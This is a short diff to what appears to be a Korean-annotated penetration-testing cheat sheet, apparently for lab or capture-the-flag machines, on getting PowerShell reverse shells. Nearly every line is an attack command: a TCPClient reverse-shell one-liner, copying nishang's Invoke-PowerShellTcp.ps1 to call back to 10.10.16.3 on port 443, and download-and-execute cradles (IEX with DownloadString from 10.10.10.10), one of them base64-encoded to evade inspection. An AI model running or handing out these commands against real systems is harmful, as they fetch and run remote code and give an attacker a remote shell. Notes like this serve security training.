@@ -25,9 +25,12 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
 ### Invoke-PowerShellTcp.ps1
 ```bash
+# Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443`를 아래에 추가.
 cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+
+# Windows base64 encoding
+echo "IEX(new-object net.webclient).DownloadString('http://10.10.10.10/ex.ps1')"|iconv -t utf-16le|base64 -w0
 ```
-- `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443`를 아래에 추가.
 
 ```powershell
 powershell "iex(new-object net.webclient).downloadstring('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
